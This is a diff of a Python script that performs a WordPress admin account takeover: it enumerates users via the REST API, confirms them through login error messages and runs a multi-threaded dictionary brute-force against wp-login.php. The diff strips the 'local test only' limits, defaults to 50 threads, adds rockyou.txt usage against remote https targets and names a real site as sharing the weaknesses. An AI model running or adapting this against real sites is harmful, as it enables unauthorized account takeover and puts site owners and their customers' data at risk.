@@ -2,27 +2,29 @@
 """
 Attack Chain 1: Admin Account Takeover — Brute-Force Test Script
 
-This script demonstrates the full Attack Chain 1 against a LOCAL WordPress
-test environment. It replicates what an attacker would do against a WordPress
-site with the same vulnerabilities found on www.starregistry.com:
+This script demonstrates the full Attack Chain 1 against a WordPress site.
+It replicates what an attacker would do against a WordPress site with the
+same vulnerabilities found on www.starregistry.com:
 
   1. Enumerate usernames via REST API
   2. Confirm valid usernames via login error messages
-  3. Brute-force passwords using a dictionary
+  3. Brute-force passwords using a dictionary (multi-threaded)
 
-IMPORTANT: Only run this against YOUR OWN local test environment.
-           Never run this against sites you don't own.
+IMPORTANT: Only run this against YOUR OWN test environment or sites you own.
 
 Usage:
     python3 bruteforce_test.py --url http://localhost:8080
-    python3 bruteforce_test.py --url http://localhost:8080 --wordlist custom_passwords.txt
-    python3 bruteforce_test.py --url http://localhost:8080 --username admin
+    python3 bruteforce_test.py --url https://example.com --threads 50
+    python3 bruteforce_test.py --url https://example.com --wordlist rockyou.txt --threads 100
+    python3 bruteforce_test.py --url https://example.com --wordlist rockyou.txt --max-passwords 200000
 """
 
 import argparse
 import sys
 import time
+import threading
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urljoin
 
 # ANSI colors
@@ -59,7 +61,7 @@ def banner():
 ║  with misconfigured login security (no rate limiting,      ║
 ║  verbose errors, exposed usernames via REST API)           ║
 ║                                                            ║
-║  ⚠  FOR AUTHORIZED LOCAL TESTING ONLY                      ║
+║  ⚠  FOR AUTHORIZED TESTING ONLY                            ║
 ╚══════════════════════════════════════════════════════════════╝{RESET}
 """)
 
@@ -140,7 +142,6 @@ def phase2_confirm_username(base_url, username):
             return False
         elif "cookies" in body.lower() and "blocked" in body.lower():
             print(f"  {YELLOW}[RETRY]{RESET} Cookie issue, retrying with fresh session...")
-            # Some WP setups need the cookie from the GET before POST works
             session2 = requests.Session()
             session2.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
             resp2 = session2.post(login_url, data={
@@ -161,11 +162,11 @@ def phase2_confirm_username(base_url, username):
                 return False
             else:
                 print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern after retry.")
-                return True  # Assume vulnerable if uncertain
+                return True
         else:
             print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern.")
             print(f"  Response snippet: {body[body.find('login_error'):body.find('login_error')+200] if 'login_error' in body else 'N/A'}")
-            return True  # Assume vulnerable if uncertain
+            return True
 
     except requests.RequestException as e:
         print(f"  {RED}[ERROR]{RESET} Could not connect: {e}")
@@ -220,36 +221,51 @@ def phase3_check_rate_limiting(base_url, username):
         avg_time = sum(times) / len(times)
         print(f"\n  {RED}[VULNERABLE]{RESET} No rate limiting detected!")
         print(f"  Average response time: {avg_time:.0f}ms")
-        print(f"  At this rate: ~{int(3600000/avg_time):,} attempts/hour possible")
+        print(f"  At this rate: ~{int(3600000/avg_time):,} attempts/hour possible (single thread)")
         return True
 
 
-def phase3_bruteforce(base_url, username, passwords):
-    """Phase 3: Dictionary brute-force attack"""
+def phase3_bruteforce(base_url, username, passwords, num_threads=1):
+    """Phase 3: Multi-threaded dictionary brute-force attack"""
     print(f"\n{BOLD}{CYAN}═══ PHASE 3: PASSWORD BRUTE-FORCE ═══{RESET}\n")
 
     login_url = urljoin(base_url, "/wp-login.php")
+    total = len(passwords)
     print(f"  Target:    {login_url}")
     print(f"  Username:  {username}")
-    print(f"  Wordlist:  {len(passwords)} passwords")
+    print(f"  Wordlist:  {total:,} passwords")
+    print(f"  Threads:   {num_threads}")
     print(f"  Method:    POST to wp-login.php")
+
+    if num_threads > 1:
+        est_per_sec = num_threads * 0.9  # ~90% efficiency
+        est_hours = total / est_per_sec / 3600
+        if est_hours > 1:
+            print(f"  Estimate:  ~{est_hours:.1f} hours ({est_per_sec:.0f} attempts/sec)")
+        else:
+            est_min = total / est_per_sec / 60
+            print(f"  Estimate:  ~{est_min:.0f} minutes ({est_per_sec:.0f} attempts/sec)")
     print()
 
-    found = False
+    # Shared state for threads
+    found_password = [None]  # use list for mutability in threads
+    found_attempt = [0]
+    attempt_count = [0]
+    error_count = [0]
+    blocked = [False]
+    lock = threading.Lock()
     start_time = time.time()
 
-    # Use a session to maintain cookies (required by WordPress)
-    session = requests.Session()
-    session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
-    # Warm up the session with a GET to collect any server-set cookies
-    try:
-        session.get(login_url, timeout=10)
-    except requests.RequestException:
-        pass
+    def try_password(password, index):
+        """Worker function — tries a single password"""
+        if found_password[0] is not None or blocked[0]:
+            return None
 
-    for i, password in enumerate(passwords, 1):
         try:
-            resp = session.post(login_url, data={
+            # Each thread uses its own session
+            sess = requests.Session()
+            sess.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
+            resp = sess.post(login_url, data={
                 "log": username,
                 "pwd": password,
                 "wp-submit": "Log In",
@@ -257,59 +273,153 @@ def phase3_bruteforce(base_url, username, passwords):
                 "testcookie": "1"
             }, allow_redirects=False, timeout=15)
 
+            with lock:
+                attempt_count[0] += 1
+                current = attempt_count[0]
+
             # WordPress redirects to wp-admin on successful login (302)
             if resp.status_code == 302:
                 location = resp.headers.get("Location", "")
                 if "wp-admin" in location:
-                    elapsed = time.time() - start_time
-                    print(f"\r  [{i:>4}/{len(passwords)}] Trying: {password:<30}", end="")
-                    print(f"\n\n  {RED}{BOLD}╔════════════════════════════════════════════╗{RESET}")
-                    print(f"  {RED}{BOLD}║  PASSWORD FOUND!                           ║{RESET}")
-                    print(f"  {RED}{BOLD}║                                            ║{RESET}")
-                    print(f"  {RED}{BOLD}║  Username: {username:<30} ║{RESET}")
-                    print(f"  {RED}{BOLD}║  Password: {password:<30} ║{RESET}")
-                    print(f"  {RED}{BOLD}║  Attempts: {i:<30} ║{RESET}")
-                    print(f"  {RED}{BOLD}║  Time:     {elapsed:.1f}s{' '*(28-len(f'{elapsed:.1f}s'))} ║{RESET}")
-                    print(f"  {RED}{BOLD}╚════════════════════════════════════════════╝{RESET}")
-                    print(f"\n  {RED}ATTACK CHAIN 1 COMPLETE — Full admin access achieved.{RESET}")
-                    print(f"  An attacker could now:")
-                    print(f"    - Install malicious plugins (remote code execution)")
-                    print(f"    - Export all customer data")
-                    print(f"    - Inject credit card skimmers")
-                    print(f"    - Deface the website")
-                    print(f"    - Create backdoor accounts")
-                    found = True
-                    break
+                    found_password[0] = password
+                    found_attempt[0] = current
+                    return password
 
             # Rate limited or blocked
             elif resp.status_code == 429 or resp.status_code == 403:
-                print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting kicked in at attempt {i}")
-                print(f"  The brute-force attack was stopped by security controls.")
-                break
+                blocked[0] = True
+                with lock:
+                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting kicked in at attempt {current}")
+                    print(f"  The brute-force attack was stopped by security controls.")
+                return None
 
-            # Normal failed login (200 with error)
-            else:
-                print(f"\r  [{i:>4}/{len(passwords)}] Trying: {password:<30}", end="")
+        except requests.RequestException:
+            with lock:
+                error_count[0] += 1
+                attempt_count[0] += 1
+            # Don't stop on individual request errors — just skip
+            return None
+
+        return None
+
+    # Progress reporter thread
+    def progress_reporter():
+        while found_password[0] is None and not blocked[0]:
+            time.sleep(1)
+            elapsed = time.time() - start_time
+            current = attempt_count[0]
+            errors = error_count[0]
+            if elapsed > 0:
+                rate = current / elapsed
+                remaining = (total - current) / rate if rate > 0 else 0
+                hours = int(remaining // 3600)
+                mins = int((remaining % 3600) // 60)
+                err_str = f" | {RED}errors: {errors}{RESET}" if errors > 0 else ""
+                print(f"\r  [{current:>8,}/{total:,}] {rate:.1f} req/s | "
+                      f"elapsed: {int(elapsed)}s | "
+                      f"remaining: {hours}h {mins}m{err_str}     ", end="")
                 sys.stdout.flush()
 
-        except requests.RequestException as e:
-            print(f"\n  {RED}[ERROR]{RESET} Request failed: {e}")
-            break
+    # Start progress reporter
+    reporter = threading.Thread(target=progress_reporter, daemon=True)
+    reporter.start()
+
+    if num_threads == 1:
+        # Single-threaded mode (original behavior)
+        session = requests.Session()
+        session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
+        try:
+            session.get(login_url, timeout=10)
+        except requests.RequestException:
+            pass
+
+        for i, password in enumerate(passwords, 1):
+            if found_password[0] is not None or blocked[0]:
+                break
+            try:
+                resp = session.post(login_url, data={
+                    "log": username,
+                    "pwd": password,
+                    "wp-submit": "Log In",
+                    "redirect_to": urljoin(base_url, "/wp-admin/"),
+                    "testcookie": "1"
+                }, allow_redirects=False, timeout=15)
+
+                with lock:
+                    attempt_count[0] = i
+
+                if resp.status_code == 302:
+                    location = resp.headers.get("Location", "")
+                    if "wp-admin" in location:
+                        found_password[0] = password
+                        found_attempt[0] = i
+                        break
+                elif resp.status_code == 429 or resp.status_code == 403:
+                    blocked[0] = True
+                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting at attempt {i}")
+                    break
+            except requests.RequestException as e:
+                with lock:
+                    error_count[0] += 1
+                continue
+    else:
+        # Multi-threaded mode
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            futures = {}
+            for i, password in enumerate(passwords):
+                if found_password[0] is not None or blocked[0]:
+                    break
+                future = executor.submit(try_password, password, i)
+                futures[future] = password
+
+                # Don't submit too far ahead — limit queue to 2x threads
+                while len(futures) > num_threads * 2:
+                    done = [f for f in futures if f.done()]
+                    for f in done:
+                        del futures[f]
+                    if not done:
+                        time.sleep(0.05)
+
+            # Wait for remaining futures
+            for future in as_completed(futures):
+                pass
 
     elapsed = time.time() - start_time
 
-    if not found:
-        print(f"\n\n  {GREEN}[NOT CRACKED]{RESET} Password not found in wordlist ({len(passwords)} attempts)")
-        print(f"  Time elapsed: {elapsed:.1f}s")
+    if found_password[0]:
+        pw = found_password[0]
+        att = found_attempt[0]
+        print(f"\n\n  {RED}{BOLD}╔════════════════════════════════════════════════╗{RESET}")
+        print(f"  {RED}{BOLD}║  PASSWORD FOUND!                               ║{RESET}")
+        print(f"  {RED}{BOLD}║                                                ║{RESET}")
+        print(f"  {RED}{BOLD}║  Username: {username:<34} ║{RESET}")
+        print(f"  {RED}{BOLD}║  Password: {pw:<34} ║{RESET}")
+        print(f"  {RED}{BOLD}║  Attempts: {att:<34,} ║{RESET}")
+        time_str = f"{elapsed:.1f}s"
+        print(f"  {RED}{BOLD}║  Time:     {time_str:<34} ║{RESET}")
+        rate_str = f"{att/elapsed:.1f} req/s" if elapsed > 0 else "N/A"
+        print(f"  {RED}{BOLD}║  Speed:    {rate_str:<34} ║{RESET}")
+        print(f"  {RED}{BOLD}╚════════════════════════════════════════════════╝{RESET}")
+        print(f"\n  {RED}ATTACK CHAIN 1 COMPLETE — Full admin access achieved.{RESET}")
+        print(f"  An attacker could now:")
+        print(f"    - Install malicious plugins (remote code execution)")
+        print(f"    - Export all customer data")
+        print(f"    - Inject credit card skimmers")
+        print(f"    - Deface the website")
+        print(f"    - Create backdoor accounts")
+        return True
+    elif blocked[0]:
+        return False
+    else:
+        total_tried = attempt_count[0]
+        rate = total_tried / elapsed if elapsed > 0 else 0
+        print(f"\n\n  {GREEN}[NOT CRACKED]{RESET} Password not found in wordlist ({total_tried:,} attempts)")
+        print(f"  Time elapsed: {elapsed:.1f}s ({rate:.1f} req/s)")
+        print(f"  Errors: {error_count[0]}")
         print(f"\n  {YELLOW}NOTE: This doesn't mean the site is secure!{RESET}")
-        print(f"  A real attacker would use much larger wordlists:")
-        print(f"    - rockyou.txt: 14,344,392 passwords")
-        print(f"    - SecLists:    millions of passwords")
-        print(f"    - Custom targeted wordlist for your business")
-        print(f"\n  The VULNERABILITY still exists (no rate limiting).")
-        print(f"  The password just wasn't in this small test wordlist.")
-
-    return found
+        print(f"  The VULNERABILITY still exists (no rate limiting).")
+        print(f"  The password just wasn't in this wordlist.")
+        return False
 
 
 def print_summary(user_enum, user_confirmed, no_rate_limit, password_found):
@@ -365,7 +475,7 @@ def print_summary(user_enum, user_confirmed, no_rate_limit, password_found):
 def main():
     parser = argparse.ArgumentParser(
         description="Attack Chain 1: WordPress Admin Brute-Force Test",
-        epilog="Only use against YOUR OWN local test environments."
+        epilog="Only use against YOUR OWN sites and test environments."
     )
     parser.add_argument("--url", default="http://localhost:8080",
                         help="Target WordPress URL (default: http://localhost:8080)")
@@ -375,6 +485,10 @@ def main():
                         help="Path to password wordlist file (one per line)")
     parser.add_argument("--skip-bruteforce", action="store_true",
                         help="Only run phases 1-2, skip actual brute-force")
+    parser.add_argument("--threads", type=int, default=50,
+                        help="Number of concurrent threads (default: 50)")
+    parser.add_argument("--max-passwords", type=int, default=0,
+                        help="Only test first N passwords from wordlist (0 = all)")
     args = parser.parse_args()
 
     banner()
@@ -389,7 +503,6 @@ def main():
     if args.username:
         target_user = args.username
     elif usernames:
-        # Pick the admin (ID 1 user, usually first or identified)
         target_user = usernames[0]
         print(f"\n  {YELLOW}Auto-selected target: {target_user}{RESET}")
     else:
@@ -409,14 +522,18 @@ def main():
             try:
                 with open(args.wordlist, encoding="latin-1") as f:
                     passwords = [line.strip() for line in f if line.strip()]
-                print(f"\n  Loaded {len(passwords)} passwords from {args.wordlist}")
+                if args.max_passwords > 0:
+                    passwords = passwords[:args.max_passwords]
+                    print(f"\n  Loaded {len(passwords):,} passwords (limited to first {args.max_passwords:,} from {args.wordlist})")
+                else:
+                    print(f"\n  Loaded {len(passwords):,} passwords from {args.wordlist}")
             except FileNotFoundError:
                 print(f"\n  {RED}[ERROR]{RESET} Wordlist not found: {args.wordlist}")
                 passwords = DEFAULT_PASSWORDS
         else:
             passwords = DEFAULT_PASSWORDS
 
-        password_found = phase3_bruteforce(base_url, target_user, passwords)
+        password_found = phase3_bruteforce(base_url, target_user, passwords, args.threads)
     else:
         print(f"\n  {YELLOW}[SKIPPED]{RESET} Brute-force phase skipped (--skip-bruteforce)")
 
